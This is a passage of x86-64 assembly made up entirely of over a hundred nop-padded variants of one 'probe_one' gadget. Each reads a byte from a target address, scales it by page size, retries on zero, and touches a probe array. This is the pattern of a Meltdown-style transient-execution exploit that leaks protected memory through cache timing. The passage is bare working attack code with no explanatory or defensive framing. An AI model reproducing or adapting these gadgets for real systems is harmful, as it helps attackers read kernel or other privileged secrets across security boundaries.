	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 508
.Lprobe_one_win0_var508:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 509
.Lprobe_one_win0_var509:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 510
.Lprobe_one_win0_var510:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 511
.Lprobe_one_win0_var511:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 512
.Lprobe_one_win0_var512:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 513
.Lprobe_one_win0_var513:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 514
.Lprobe_one_win0_var514:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 515
.Lprobe_one_win0_var515:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 516
.Lprobe_one_win0_var516:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 517
.Lprobe_one_win0_var517:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 518
.Lprobe_one_win0_var518:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 519
.Lprobe_one_win0_var519:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 520
.Lprobe_one_win0_var520:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 521
.Lprobe_one_win0_var521:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 522
.Lprobe_one_win0_var522:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 523
.Lprobe_one_win0_var523:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 524
.Lprobe_one_win0_var524:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 525
.Lprobe_one_win0_var525:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 526
.Lprobe_one_win0_var526:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 527
.Lprobe_one_win0_var527:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 528
.Lprobe_one_win0_var528:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 529
.Lprobe_one_win0_var529:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 530
.Lprobe_one_win0_var530:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 531
.Lprobe_one_win0_var531:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 532
.Lprobe_one_win0_var532:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 533
.Lprobe_one_win0_var533:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 534
.Lprobe_one_win0_var534:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 535
.Lprobe_one_win0_var535:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 536
.Lprobe_one_win0_var536:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 537
.Lprobe_one_win0_var537:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 538
.Lprobe_one_win0_var538:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 539
.Lprobe_one_win0_var539:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 540
.Lprobe_one_win0_var540:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 541
.Lprobe_one_win0_var541:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 542
.Lprobe_one_win0_var542:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 543
.Lprobe_one_win0_var543:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 544
.Lprobe_one_win0_var544:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 545
.Lprobe_one_win0_var545:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 546
.Lprobe_one_win0_var546:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 547
.Lprobe_one_win0_var547:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 548
.Lprobe_one_win0_var548:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 549
.Lprobe_one_win0_var549:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 550
.Lprobe_one_win0_var550:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 551
.Lprobe_one_win0_var551:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 552
.Lprobe_one_win0_var552:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 553
.Lprobe_one_win0_var553:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 554
.Lprobe_one_win0_var554:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 555
.Lprobe_one_win0_var555:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 556
.Lprobe_one_win0_var556:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 557
.Lprobe_one_win0_var557:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 558
.Lprobe_one_win0_var558:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 559
.Lprobe_one_win0_var559:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 560
.Lprobe_one_win0_var560:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 561
.Lprobe_one_win0_var561:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 562
.Lprobe_one_win0_var562:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 563
.Lprobe_one_win0_var563:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 564
.Lprobe_one_win0_var564:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 565
.Lprobe_one_win0_var565:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 566
.Lprobe_one_win0_var566:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 567
.Lprobe_one_win0_var567:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 568
.Lprobe_one_win0_var568:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 569
.Lprobe_one_win0_var569:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 570
.Lprobe_one_win0_var570:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 571
.Lprobe_one_win0_var571:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 572
.Lprobe_one_win0_var572:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 573
.Lprobe_one_win0_var573:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 574
.Lprobe_one_win0_var574:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 575
.Lprobe_one_win0_var575:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 576
.Lprobe_one_win0_var576:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 577
.Lprobe_one_win0_var577:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 578
.Lprobe_one_win0_var578:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 579
.Lprobe_one_win0_var579:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 580
.Lprobe_one_win0_var580:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 581
.Lprobe_one_win0_var581:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 582
.Lprobe_one_win0_var582:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 583
.Lprobe_one_win0_var583:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 584
.Lprobe_one_win0_var584:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 585
.Lprobe_one_win0_var585:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 586
.Lprobe_one_win0_var586:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 587
.Lprobe_one_win0_var587:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 588
.Lprobe_one_win0_var588:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 589
.Lprobe_one_win0_var589:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 590
.Lprobe_one_win0_var590:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 591
.Lprobe_one_win0_var591:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 592
.Lprobe_one_win0_var592:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 593
.Lprobe_one_win0_var593:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 594
.Lprobe_one_win0_var594:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 595
.Lprobe_one_win0_var595:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 596
.Lprobe_one_win0_var596:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 597
.Lprobe_one_win0_var597:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 598
.Lprobe_one_win0_var598:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 599
.Lprobe_one_win0_var599:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 600
.Lprobe_one_win0_var600:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 601
.Lprobe_one_win0_var601:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 602
.Lprobe_one_win0_var602:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 603
.Lprobe_one_win0_var603:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 604
.Lprobe_one_win0_var604:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 605
.Lprobe_one_win0_var605:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 606
.Lprobe_one_win0_var606:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 607
.Lprobe_one_win0_var607:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 608
.Lprobe_one_win0_var608:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 609
.Lprobe_one_win0_var609:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 610
.Lprobe_one_win0_var610:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 611
.Lprobe_one_win0_var611:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 612
.Lprobe_one_win0_var612:
	popq	%rax
